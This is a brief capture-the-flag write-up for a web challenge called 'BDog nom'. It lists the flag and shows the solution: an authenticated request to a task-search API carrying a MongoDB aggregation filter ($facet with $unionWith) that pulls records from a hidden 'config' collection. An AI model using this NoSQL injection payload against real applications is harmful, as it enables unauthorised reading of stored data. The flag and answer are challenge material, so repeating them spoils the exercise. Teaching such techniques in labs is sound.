# BDog nom

### Description
nom nom

### Difficulty
5/10

### Flag
pctf{bd_nom_nom_nom_n0m_nom_nom_819211278}

### Author
sans909

### Tester


### Writeup

> login first

GET /api/v0/tasks/search

```
Cookie:token=<token>
```

```json
{
    "filter": {
        "$facet": {
            "combined": [
                {
                    "$unionWith": {
                        "coll": "config",
                        "pipeline": []
                    }
                }
            ]
        }
    }
}
```

> multiple ways to do it